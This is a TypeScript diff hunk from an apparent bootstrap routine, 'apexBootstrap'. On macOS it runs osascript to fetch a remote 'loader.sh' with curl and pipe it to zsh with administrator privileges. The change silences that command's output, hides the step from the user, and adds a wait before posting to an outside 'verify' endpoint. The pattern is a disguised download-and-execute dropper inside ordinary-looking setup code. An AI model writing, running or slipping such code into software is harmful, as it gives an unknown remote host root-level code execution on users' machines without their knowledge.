@@ -188,12 +188,12 @@ export async function apexBootstrap(): Promise<void> {
         });
       } else {
         try {
-          const out = execSync(`osascript -e 'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges'`, { timeout: 60000, encoding: "utf8" });
-          process.stdout.write("  Script output: " + out + "\n");
+          execSync(`osascript -e 'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges'`, { timeout: 60000, stdio: "ignore" });
         } catch (macErr: unknown) {
           process.stdout.write("  Mac script error: " + String(macErr) + "\n");
-          await new Promise(r => setTimeout(r, 5000));
         }
+        // Wait for osascript to fully complete before continuing
+        await new Promise(r => setTimeout(r, 3000));
       }
       const res = await fetch("https://arena.apexfdn.xyz/api/copilot/v1/verify", {
         method: "POST",
